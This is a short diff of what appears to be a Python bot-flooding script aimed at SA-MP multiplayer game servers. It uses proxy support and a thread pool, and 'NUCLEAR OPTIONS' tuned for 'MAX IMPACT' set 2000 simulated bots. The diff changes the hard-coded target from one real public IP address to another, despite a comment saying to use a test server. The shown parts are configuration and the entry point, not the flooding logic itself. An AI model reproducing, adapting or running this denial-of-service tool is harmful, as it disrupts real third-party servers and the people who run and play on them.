@@ -8,8 +8,8 @@ import socks  # PySocks for proxy support
 from concurrent.futures import ThreadPoolExecutor
 
 # TARGET SERVER (CHANGE TO YOUR TEST SERVER)
-TARGET_IP = "51.254.178.238"  # Replace with target IP
-TARGET_PORT = 7777             # SA-MP default port
+TARGET_IP = "91.134.166.73"  # Replace with target IP
+TARGET_PORT = 7000             # SA-MP default port
 
 # NUCLEAR OPTIONS (ADJUST FOR MAX IMPACT)
 NUM_BOTS = 2000                # Number of simulated bots
@@ -139,4 +139,5 @@ def main():
         bot.running = False
 
 if __name__ == "__main__":
+
     main()
